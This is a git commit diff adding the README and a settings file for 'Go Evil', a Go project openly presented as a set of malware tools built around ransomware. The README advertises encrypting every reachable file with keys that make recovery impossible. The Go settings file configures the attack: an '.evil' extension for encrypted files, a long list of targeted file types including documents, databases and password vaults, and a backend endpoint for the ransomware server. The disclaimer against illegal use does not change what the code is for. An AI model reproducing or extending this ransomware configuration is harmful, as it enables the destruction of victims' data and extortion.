263b95b701f546059be64b34e6db2148195f8d7f
PaulDotSH <84643540+PaulDotSH@users.noreply.github.com>
2022-04-17 12:22:44 -0500

    initial release

---
+++ README.md
@@ -0,0 +1,22 @@
+# GO EVIL
+
+Go Evil is a collection of malware-like tools that work with each other, using the "evil" backend.
+
+# Features
+
+## General
+ - Cross Platform
+## Ransomware
+ - Encrypts all files it can from the computer
+ - Uses a random salt
+ - Uses a cryptographically secure random generator (files CANNOT be decrypted without the key)
+ - Customizable extension and list of extensions to encrypt
+ - Much more
+
+## License
+All of these tools which are written by me are licensed under AGPL 3.0
+However, any tools I integrate from other projects maintain their original license unless they are modified and the license permits so.
+
+# DISCLAIMER
+## YOU SHOULD NOT USE ANY OF THESE TOOLS FOR ILLEGAL PURPOSES
+
---
+++ ransomware/ransom/settings.go
@@ -0,0 +1,15 @@
+package ransom
+
+const extension = ".evil"
+
+const maxFileSize = 1024 * 1024 * 1024 * 1024
+
+var extensions = []string{
+	".txt", ".py", ".hc", ".mp4", ".7z", ".flp", ".mkv", ".flac", ".flv", ".dat", ".kdbx", ".aep", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".odp", ".ods", ".odt", ".ppt", ".pptx", ".raw", ".jpg", ".jpeg", ".png", ".csv", ".py", ".sql", ".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".c", ".cs", ".mp3", ".mp4", ".f3d", ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi", ".iso", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".db",
+}
+
+const Debug = true
+
+const endpoint = "127.0.0.1:6031/ransomware"
+
+const charset = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789!@#$%^&*()_-+={}[]:\";'\\<>,.?/`~"
